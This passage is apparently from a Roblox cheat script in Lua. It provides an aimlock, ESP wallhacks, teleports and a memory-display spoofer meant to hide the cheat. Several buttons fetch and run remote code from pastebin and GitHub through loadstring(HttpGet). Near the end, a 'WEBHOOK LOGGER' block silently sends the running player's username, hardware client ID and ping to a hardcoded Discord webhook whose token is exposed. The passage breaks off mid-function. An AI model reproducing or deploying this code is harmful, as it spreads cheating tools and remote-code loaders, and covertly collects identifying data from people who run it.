                                math.random(-getgenv().Settings.AimAssist.ShakePower, getgenv().Settings.AimAssist.ShakePower)
                            ) *
                                0.1
                        TargetVelv1.AssemblyLinearVelocity =
                            Vec3(TargetVelv1.Velocity.X, TargetVelv1.Velocity.Y, TargetVelv1.Velocity.Z) +
                            Vec3(
                                math.random(-getgenv().Settings.AimAssist.ShakePower, getgenv().Settings.AimAssist.ShakePower),
                                math.random(-getgenv().Settings.AimAssist.ShakePower, getgenv().Settings.AimAssist.ShakePower),
                                math.random(-getgenv().Settings.AimAssist.ShakePower, getgenv().Settings.AimAssist.ShakePower)
                            ) *
                                0.1
                    end
                )
            end
            if getgenv().Settings.Resolver.UnderGround == true and AimlockTarget and AimlockTarget.Character then
                pcall(
                    function()
                        local TargetVelv2 = AimlockTarget.Character[getgenv().Settings.Part.AimPart]
                        TargetVelv2.Velocity = Vec3(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
                        TargetVelv2.AssemblyLinearVelocity = Vec3(TargetVelv2.Velocity.X, 0, TargetVelv2.Velocity.Z)
                    end
                )
            end
            if
                getgenv().Settings.Resolver.Desync == true and AimlockTarget and AimlockTarget.Character and
                    AimlockTarget.Character:WaitForChild("HumanoidRootPart").Velocity.magnitude >
                        getgenv().Settings.Resolver.Detection
             then
                pcall(
                    function()
                        local TargetVel = AimlockTarget.Character[getgenv().Settings.Part.AimPart]
                        TargetVel.Velocity = Vec3(0, 0, 0)
                        TargetVel.AssemblyLinearVelocity = Vec3(0, 0, 0)
                    end
                )
            end
            if getgenv().Settings.AimAssist.ThirdPerson == true and getgenv().Settings.AimAssist.FirstPerson == true then
                if
                    (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or
                        (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1
                 then
                    CanNotify = true
                else
                    CanNotify = false
                end
            elseif getgenv().Settings.AimAssist.ThirdPerson == true and getgenv().Settings.AimAssist.FirstPerson == false then
                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then
                    CanNotify = true
                else
                    CanNotify = false
                end
            elseif getgenv().Settings.AimAssist.ThirdPerson == false and getgenv().Settings.AimAssist.FirstPerson == true then
                if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then
                    CanNotify = true
                else
                    CanNotify = false
                end
            end
            
            if getgenv().Settings.AimAssist.AutoPingSets == true and getgenv().Settings.Prediction.PredictionVelocity then
                local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                local split = string.split(pingvalue, "(")
                local ping = tonumber(split[1])
                if ping > 190 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.206547
                elseif ping > 180 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.19284
                elseif ping > 170 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.1923111
                elseif ping > 160 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.1823111
                elseif ping > 150 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.171
                elseif ping > 140 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.165773
                elseif ping > 130 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.1223333
                elseif ping > 120 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.143765
                elseif ping > 110 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.1455
                elseif ping > 100 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.130340
                elseif ping > 90 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.136
                elseif ping > 80 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.1347
                elseif ping > 70 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.119
                elseif ping > 60 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.12731
                elseif ping > 50 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.127668
                elseif ping > 40 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.125
                elseif ping > 30 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.11
                elseif ping > 20 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.12588
                elseif ping > 10 then
                    getgenv().Settings.Prediction.PredictionVelocity = 0.9
                end
            end
            if getgenv().Settings.Check.CheckIfKo == true and AimlockTarget and AimlockTarget.Character then
                local KOd = AimlockTarget.Character:WaitForChild("BodyEffects")["K.O"].Value
                local Grabbed = AimlockTarget.Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
                if AimlockTarget.Character.Humanoid.health < 1 or KOd or Grabbed then
                    if MousePressed == true then
                        AimlockTarget = nil
                        MousePressed = false
                    end
                end
            end
            if
                getgenv().Settings.Check.DisableOnTargetDeath == true and AimlockTarget and
                    AimlockTarget.Character:FindFirstChild("Humanoid")
             then
                if AimlockTarget.Character.Humanoid.health < 1 then
                    if MousePressed == true then
                        AimlockTarget = nil
                        MousePressed = false
                    end
                end
            end
            if
                getgenv().Settings.Check.DisableOnPlayerDeath == true and Client.Character and
                    Client.Character:FindFirstChild("Humanoid") and
                    Client.Character.Humanoid.health < 1
             then
                if MousePressed == true then
                    AimlockTarget = nil
                    MousePressed = false
                end
            end
            if getgenv().Settings.Part.CheckIfJumped == true and getgenv().Settings.Part.GetClosestPart == false then
                if AimlockTarget and AimlockTarget.Character then
                    if AimlockTarget.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                        getgenv().Settings.Part.AimPart = getgenv().Settings.Part.CheckIfJumpedAimPart
                    else
                        getgenv().Settings.Part.AimPart = OldAimPart
                    end
                end
            end
            if
                AimlockTarget and AimlockTarget.Character and
                    AimlockTarget.Character:FindFirstChild(getgenv().Settings.Part.AimPart)
             then
                if getgenv().Settings.AimAssist.FirstPerson == true then
                    if CanNotify == true then
                        if getgenv().Settings.Prediction.PredictMovement == true then
                            if getgenv().Settings.Smooth.Smoothness == true then
                                local AimAssist =
                                    CF(
                                    Camera.CFrame.p,
                                    AimlockTarget.Character[getgenv().Settings.Part.AimPart].Position +
                                        AimlockTarget.Character.Humanoid.MoveDirection * getgenv().Settings.Prediction.PredictionVelocity * 16
                                )
  
                                Camera.CFrame =
                                    Camera.CFrame:Lerp(
                                    AimAssist,
                                    getgenv().Settings.Smooth.SmoothnessAmount,
                                    Enum.EasingStyle.Elastic,
                                    Enum.EasingDirection.InOut
                                )
                            else
                                Camera.CFrame =
                                    CF(
                                    Camera.CFrame.p,
                                    AimlockTarget.Character[getgenv().Settings.Part.AimPart].CFrame +
                                        AimlockTarget.Character.Humanoid.MoveDirection * getgenv().Settings.Prediction.PredictionVelocity * 16 + Vector3
                                )
                            end
                        elseif getgenv().Settings.Prediction.PredictMovement == false then
                            if getgenv().Settings.Smooth.Smoothness == true then
                                local AimAssist =
                                    CF(
                                    Camera.CFrame.p,
                                    AimlockTarget.Character[getgenv().Settings.Part.AimPart].Position
                                )
                                Camera.CFrame =
                                    Camera.CFrame:Lerp(
                                    AimAssist,
                                    getgenv().Settings.Smooth.SmoothnessAmount
                                    
                                )
                            else
                                Camera.CFrame =
                                    CF(
                                    Camera.CFrame.p,
                                    AimlockTarget.Character[getgenv().Settings.Part.AimPart].Position
                                )
                            end
                        end
                    end
                end
            end
        end
    end
  )local PerformanceStats = game:GetService("CoreGui"):WaitForChild("RobloxGui"):WaitForChild("PerformanceStats")
  
  local MemLabel
  local color,
    color1,
    color2,
    color3,
    color4,
    color5,
    color6,
    color7,
    color8,
    color9,
    color10,
    color11,
    color12,
    color13,
    color14,
    color15,
    color16,
    color17,
    color18,
    color19
  for I, Child in next, PerformanceStats:GetChildren() do
    if Child.StatsMiniTextPanelClass.TitleLabel.Text == "Mem" then
        MemLabel = Child.StatsMiniTextPanelClass.ValueLabel
        color = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_0
        color1 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_1
        color2 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_2
        color3 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_3
        color4 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_4
        color5 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_5
        color6 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_6
        color7 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_7
        color8 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_8
        color9 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_9
        color10 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_10
        color11 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_11
        color12 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_12
        color13 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_13
        color14 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_14
        color15 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_15
        color16 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_16
        color17 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_17
        color18 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_18
        color19 = Child.PS_AnnotatedGraph.PS_BarFrame.Bar_19
        break
    end
  end
  MemLabel:GetPropertyChangedSignal("Text"):Connect(
    function()
        if Settings.Spoofer.MemorySpoofer == true then
            MemLabel.Text = math.random(Settings.Spoofer.MemoryLeast, Settings.Spoofer.MemoryMost) / 100 .. " MB"
            color.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color1.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color2.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color3.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color4.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color5.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color6.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color7.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color8.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color9.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color10.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color11.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color12.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color13.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color14.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color15.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color16.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color17.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color18.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
            color19.BackgroundColor3 = Settings.Spoofer.MemoryTabColor
        end
  end)
  end
  )()
				end
})
SilentSec:AddLabel("This is the currently all the silents i have that works")



local Visual = Window:MakeTab({
	Name = "Visuals",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local VisSec = Visual:AddSection({
	Name = "Visuals"
})
VisSec:AddButton({
	Name = "Highlight esp",
	Callback = function()
local FillColor = Color3.fromRGB(175,25,255)
local DepthMode = "AlwaysOnTop"
local FillTransparency = 0.5
local OutlineColor = Color3.fromRGB(255,255,255)
local OutlineTransparency = 0

local CoreGui = game:FindService("CoreGui")
local Players = game:FindService("Players")
local lp = Players.LocalPlayer
local connections = {}

local Storage = Instance.new("Folder")
Storage.Parent = CoreGui
Storage.Name = "Highlight_Storage"

local function Highlight(plr)
    local Highlight = Instance.new("Highlight")
    Highlight.Name = plr.Name
    Highlight.FillColor = FillColor
    Highlight.DepthMode = DepthMode
    Highlight.FillTransparency = FillTransparency
    Highlight.OutlineColor = OutlineColor
    Highlight.OutlineTransparency = 0
    Highlight.Parent = Storage
    
    local plrchar = plr.Character
    if plrchar then
        Highlight.Adornee = plrchar
    end

    connections[plr] = plr.CharacterAdded:Connect(function(char)
        Highlight.Adornee = char
    end)
end

Players.PlayerAdded:Connect(Highlight)
for i,v in next, Players:GetPlayers() do
    Highlight(v)
end

Players.PlayerRemoving:Connect(function(plr)
    local plrname = plr.Name
    if Storage[plrname] then
        Storage[plrname]:Destroy()
    end
    if connections[plr] then
        connections[plr]:Disconnect()
    end
end)
	end
})
VisSec:AddButton({
	Name = "Esp #2",
	Callback = function()
		getgenv().enabled = true --Toggle on/off
getgenv().filluseteamcolor = false --Toggle fill color using player team color on/off
getgenv().outlineuseteamcolor = false --Toggle outline color using player team color on/off
getgenv().fillcolor = Color3.new(0, 0, 0) --Change fill color, no need to edit if using team color
getgenv().outlinecolor = Color3.new(1, 1, 1) --Change outline color, no need to edit if using team color
getgenv().filltrans = 0 --Change fill transparency
getgenv().outlinetrans = 0 --Change outline transparency
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/zntly/highlight-esp/main/esp.lua"))()
	end
})
VisSec:AddButton({
	Name = "Esp #3 ( P )",
	Callback = function()
			     wait(4)
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local esptoggle = "p" -- toggle key




--[Main Variables]

local plrs = game["Players"]
local rs = game["RunService"]
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = workspace.CurrentCamera
local plr = plrs.LocalPlayer
local mouse = plr:GetMouse()
local camera = workspace.CurrentCamera
local worldToViewportPoint = camera.worldToViewportPoint
local cc = Instance.new("ColorCorrectionEffect", game.Lighting)
local blur = Instance.new("BlurEffect", game.Lighting)
local sun = Instance.new("SunRaysEffect", game.Lighting)
blur.Size = 0
sun.Intensity = 0

--[Optimisation Variables]

local Drawingnew = Drawing.new
local Color3fromRGB = Color3.fromRGB
local Vector3new = Vector3.new
local Vector2new = Vector2.new
local mathfloor = math.floor
local mathceil = math.ceil

--[Setup Table]

-- esp.enabled

local esp = {
    players = {},
    enabled = false,
    teamcheck = true,
    fontsize = 16,
    font = 0,
    settings = {
        name = {
            enabled = true,
            outline = true,
            color = Color3fromRGB(0, 0, 0),
            outlineColor = Color3fromRGB(105, 105, 105)
        },
        box = {
            enabled = true,
            outline = true,
            color = Color3fromRGB(0, 0, 0),
            outlineColor = Color3fromRGB(0, 0, 0)
        },
        healthbar = {
            enabled = true,
            outline = true,
            color = Color3fromRGB(0, 0, 0),
            outlineColor = Color3fromRGB(0, 0, 0)
        },
        healthtext = {
            enabled = true,
            outline = true,
            color = Color3fromRGB(0, 0, 0),
            outlineColor = Color3fromRGB(105, 105, 105)
        },
        distance = {
            enabled = true,
            outline = true,
            color = Color3fromRGB(0, 0, 0),
            outlineColor = Color3fromRGB(105, 105, 105)
        }
    }
}

esp.NewDrawing = function(type, properties)
    local newDrawing = Drawingnew(type)

    for i, v in next, properties or {} do
        newDrawing[i] = v
    end

    return newDrawing
end

esp.NewPlayer = function(v)
    esp.players[v] = {
        name = esp.NewDrawing(
            "Text",
            {Color = Color3fromRGB(94, 0, 255), Outline = true, Center = true, Size = 13, Font = 0}
        ),
        boxOutline = esp.NewDrawing("Square", {Color = Color3fromRGB(0, 0, 0), Thickness = 3}),
        box = esp.NewDrawing("Square", {Color = Color3fromRGB(108, 11, 204), Thickness = 1}),
        healthBarOutline = esp.NewDrawing("Line", {Color = Color3fromRGB(0, 0, 0), Thickness = 3}),
        healthBar = esp.NewDrawing("Line", {Color = Color3fromRGB(255, 255, 255), Thickness = 1}),
        healthText = esp.NewDrawing(
            "Text",
            {Color = Color3fromRGB(94, 0, 255), Outline = true, Center = true, Size = 13, Font = 0}
        ),
        distance = esp.NewDrawing(
            "Text",
            {Color = Color3fromRGB(94, 0, 255), Outline = true, Center = true, Size = 13, Font = 0}
        )
    }
end

for _, v in ipairs(plrs:GetPlayers()) do
    esp.NewPlayer(v)
end

plrs.PlayerAdded:Connect(
    function(v)
        esp.NewPlayer(v)
    end
)

plrs.PlayerRemoving:Connect(
    function(v)
        for i, v in pairs(esp.players[v]) do
            v:Remove()
        end
        esp.players[v] = nil
    end
)

local mainLoop =
    rs.RenderStepped:Connect(
    function()
        for i, v in pairs(esp.players) do
            if
                i ~= plr and i.Character and i.Character:FindFirstChild("Humanoid") and
                    i.Character:FindFirstChild("HumanoidRootPart") and
                    i.Character:FindFirstChild("Head")
             then
                local hum = i.Character.Humanoid
                local hrp = i.Character.HumanoidRootPart
                local head = i.Character.Head

                local Vector, onScreen = camera:WorldToViewportPoint(i.Character.HumanoidRootPart.Position)

                local Size =
                    (camera:WorldToViewportPoint(hrp.Position - Vector3new(0, 3, 0)).Y -
                    camera:WorldToViewportPoint(hrp.Position + Vector3new(0, 2.6, 0)).Y) /
                    2
                local BoxSize = Vector2new(mathfloor(Size * 1.5), mathfloor(Size * 1.9))
                local BoxPos = Vector2new(mathfloor(Vector.X - Size * 1.5 / 2), mathfloor(Vector.Y - Size * 1.6 / 2))

                local BottomOffset = BoxSize.Y + BoxPos.Y + 1

                if onScreen and esp.enabled then
                    if esp.settings.name.enabled then
                        v.name.Position = Vector2new(BoxSize.X / 2 + BoxPos.X, BoxPos.Y - 16)
                        v.name.Outline = esp.settings.name.outline
                        v.name.Text = tostring(i)
                        v.name.Color = esp.settings.name.color
                        v.name.OutlineColor = esp.settings.name.outlineColor
                        v.name.Font = esp.font
                        v.name.Size = esp.fontsize

                        v.name.Visible = true
                    else
                        v.name.Visible = false
                    end

                    if
                        esp.settings.distance.enabled and plr.Character and
                            plr.Character:FindFirstChild("HumanoidRootPart")
                     then
                        v.distance.Position = Vector2new(BoxSize.X / 2 + BoxPos.X, BottomOffset)
                        v.distance.Outline = esp.settings.distance.outline
                        v.distance.Text =
                            "[" .. mathfloor((hrp.Position - plr.Character.HumanoidRootPart.Position).Magnitude) .. "m]"
                        v.distance.Color = esp.settings.distance.color
                        v.distance.OutlineColor = esp.settings.distance.outlineColor
                        BottomOffset = BottomOffset + 15

                        v.distance.Font = esp.font
                        v.distance.Size = esp.fontsize

                        v.distance.Visible = true
                    else
                        v.distance.Visible = false
                    end

                    if esp.settings.box.enabled then
                        v.boxOutline.Size = BoxSize
                        v.boxOutline.Position = BoxPos
                        v.boxOutline.Visible = esp.settings.box.outline
                        v.boxOutline.Color = esp.settings.box.outlineColor

                        v.box.Size = BoxSize
                        v.box.Position = BoxPos
                        v.box.Color = esp.settings.box.color
                        v.box.Visible = true
                    else
                        v.boxOutline.Visible = false
                        v.box.Visible = false
                    end

                    if esp.settings.healthbar.enabled then
                        v.healthBar.From = Vector2new((BoxPos.X - 5), BoxPos.Y + BoxSize.Y)
                        v.healthBar.To =
                            Vector2new(
                            v.healthBar.From.X,
                            v.healthBar.From.Y - (hum.Health / hum.MaxHealth) * BoxSize.Y
                        )
                        v.healthBar.Color = esp.settings.healthbar.color
                        v.healthBar.Visible = true

                        v.healthBarOutline.From = Vector2new(v.healthBar.From.X, BoxPos.Y + BoxSize.Y + 1)
                        v.healthBarOutline.To = Vector2new(v.healthBar.From.X, (v.healthBar.From.Y - 1 * BoxSize.Y) - 1)
                        v.healthBarOutline.Color = esp.settings.healthbar.outlineColor
                        v.healthBarOutline.Visible = esp.settings.healthbar.outline
                    else
                        v.healthBarOutline.Visible = false
                        v.healthBar.Visible = false
                    end

                    if esp.settings.healthtext.enabled then
                        v.healthText.Text = tostring(mathfloor((hum.Health / hum.MaxHealth) * 100 + 0.5))
                        v.healthText.Position = Vector2new((BoxPos.X - 20), (BoxPos.Y + BoxSize.Y - 1 * BoxSize.Y) - 1)
                        v.healthText.Color = esp.settings.healthtext.color
                        v.healthText.OutlineColor = esp.settings.healthtext.outlineColor
                        v.healthText.Outline = esp.settings.healthtext.outline

                        v.healthText.Font = esp.font
                        v.healthText.Size = esp.fontsize

                        v.healthText.Visible = true
                    else
                        v.healthText.Visible = false
                    end

                    if esp.teamcheck then
                        if v.TeamColor ~= plr.TeamColor then
                            v.name.Visible = esp.settings.name.enabled
                            v.box.Visible = esp.settings.box.enabled
                            v.healthBar.Visible = esp.settings.healthbar.enabled
                            v.healthText.Visible = esp.settings.healthtext.enabled
                            v.distance.Visible = esp.settings.distance.enabled
                        else
                            v.name.Visible = false
                            v.boxOutline.Visible = false
                            v.box.Visible = false
                            v.healthBarOutline.Visible = false
                            v.healthBar.Visible = false
                            v.healthText.Visible = false
                            v.distance.Visible = false
                        end
                    end
                else
                    v.name.Visible = false
                    v.boxOutline.Visible = false
                    v.box.Visible = false
                    v.healthBarOutline.Visible = false
                    v.healthBar.Visible = false
                    v.healthText.Visible = false
                    v.distance.Visible = false
                end
            else
                v.name.Visible = false
                v.boxOutline.Visible = false
                v.box.Visible = false
                v.healthBarOutline.Visible = false
                v.healthBar.Visible = false
                v.healthText.Visible = false
                v.distance.Visible = false
            end
        end
    end
)

getgenv().esp = esp
--esp


local mouse = game.Players.LocalPlayer:GetMouse()



mouse.KeyDown:Connect(function(value)
if value == esptoggle then
if esp.enabled == true then
	esp.enabled = false
else
	esp.enabled = true
end
end
end)
	end,

})
local OtherSec = Visual:AddSection({
	Name = "Others",
})
OtherSec:AddButton({
	Name = "Rainbow body",
	Callback = function()
		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("MeshPart") then
        v.Material = "ForceField"
        spawn(function()
            while wait() do
                for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA("MeshPart") then
                        v.Color = Color3.fromHSV(tick()%5/5,1,1)
                        wait()
                    end
                end 
            end
        end)
    end
end

	end
})
OtherSec:AddButton({
	Name = "Upgraded low gfx",
	Callback = function()
	for _,v in pairs(workspace:GetDescendants()) do
if v.ClassName == "Part"
or v.ClassName == "SpawnLocation"
or v.ClassName == "WedgePart"
or v.ClassName == "Terrain"
or v.ClassName == "MeshPart" then
v.Material = "Plastic"
end
end
			end
})
local Tp = Window:MakeTab({
	Name = "Teleports",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local TpSec = Tp:AddSection({
	Name = "Teleports",
})
TpSec:AddButton({
	Name = "School",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-653.501220703125, 21.749977111816406, 255.9691162109375)
			end
})
TpSec:AddButton({
	Name = "Bank",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-441.7593994140625, 38.99188995361328, -284.0293273925781)
	end
})
TpSec:AddButton({
	Name = "Food #1",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-341.3548278808594, 23.68264389038086, -298.00665283203125)
	end
})
TpSec:AddButton({
	Name = "Food #2",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(299.9042053222656, 49.28265380859375, -614.06298828125)
	end
})
TpSec:AddButton({
	Name = "DownHill fire station",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-147.26791381835938, 27.710880279541016, -98.66343688964844)
	end
})
TpSec:AddButton({
	Name = "Uphill fire station",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(444.80010986328125, 54.56044006347656, -733.7199096679688)
	end
})
TpSec:AddButton({
	Name = "Hood fitness",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-75.61431884765625, 22.700284957885742, -610.0675659179688)	
	end
})
TpSec:AddButton({
	Name = "Hood Kicks",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-198.98568725585938, 21.845796585083008, -410.3656921386719)
	end
})
TpSec:AddButton({
	Name = "Night club",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.9931335449219, 48.52669143676758, -447.0400085449219)
	end
})
TpSec:AddButton({
	Name = "Flower shop",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-71.49768829345703, 23.151729583740234, -328.9456787109375)
	end
})
TpSec:AddButton({
	Name = "Downhill gun",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-573.3197021484375, 8.314778327941895, -736.2398071289062)
	end
})
TpSec:AddButton({
	Name = "Medium armor",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-605.431396484375, 10.349687576293945, -788.3162841796875)
	end
})
TpSec:AddButton({
	Name = "Uphill gun",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.6898193359375, 48.070491790771484, -616.314208984375)
	end
})
TpSec:AddButton({
	Name = "Hair salon",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-857.9212646484375, 22.005002975463867, -648.8995971679688)
	end
})
TpSec:AddButton({
	Name = "Foodsmart",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-906.0426025390625, 21.7549991607666, -640.0313720703125)
	end
})
TpSec:AddButton({
	Name = "Car swift",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-796.52734375, 21.8799991607666, -634.656005859375)
	end
})
TpSec:AddButton({
	Name = "Mat laundry",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-957.1806640625, 21.7550048828125, -630.3565673828125)
	end
})
TpSec:AddButton({
	Name = "Basketball Field",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-932.3084716796875, 22.099815368652344, -482.66326904296875)
	end
})
TpSec:AddButton({
	Name = "Playground",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-277.5599060058594, 21.75499725341797, -795.440673828125)
	end
})
TpSec:AddButton({
	Name = "Gas station",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(579.2716674804688, 49.00003433227539, -259.1779479980469)
	end
})
TpSec:AddButton({
	Name = "Casino",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-825.019775390625, 21.3749942779541, -166.4237060546875)
	end
})
TpSec:AddButton({
	Name = "Double barrel",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1043.4024658203125, 21.7499942779541, -260.6334533691406)
	end
})
TpSec:AddButton({
	Name = "Revolver",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-642.7546997070312, 21.7499942779541, -122.9597396850586)
	end
})
local Others = Window:MakeTab({
	Name = "Others",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--•┃Others tab┃•-- Working Completed/Adding more things


local OthersSec = Others:AddSection({
	Name = "GUIs"
})
OthersSec:AddButton({
	Name = "Kill bot",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Tibosity/killbot/main/source",true))()
end
})
OthersSec:AddButton({
	Name = "Specter.lua",
	Callback = function()
	loadstring(game:HttpGet('https://pastebin.com/raw/t2uifxwN'))()
	end
})
OthersSec:AddButton({
	Name = "Oracle.lua",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/UXEa23sy'))()
							end
})
OthersSec:AddButton({
	Name = "TokwaWare",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/iD6TDeJr'))
	end
})
OthersSec:AddButton({
	Name = "Slime X",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/rfz97nzt"))()
end
})
OthersSec:AddButton({
	Name = "SpaceWare",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Maxiiiiiiiiiiiiiiiiiiiiiii/spaceware/main/spaceware'))()
	end
})
























-- WEBHOOK LOGGER

local webh = "https://discord.com/api/webhooks/1080359736756678737/moZsfWYNmf09pyCle9sy841uwgVWC8UdqAZb6Ok0uMObxodqHAAPVfMIyq8eSZWn01qT"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = '------------------',
       ['description'] = 'User executed! Here are the logs!',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)


-- WEBHOOK LOGGER

local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")
function getplatform()
    if (GuiService:IsTenFootInterface()) then
        return "Console" -- detects if the dude is on console
    elseif (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) then
        --touchscreen computers now have touchenabled so make sure to check for lack of mouse too
        --also, not all phones/tablets have accelerometer and/or gyroscope
        local DeviceSize = workspace.CurrentCamera.ViewportSize
        if (DeviceSize.Y > 600) then
            return "Mobile (Tablet)" -- Detects if the dude is on tablet
        else
            return "Mobile (Phone)" --Detects if the dude is on mobile
        end
    else
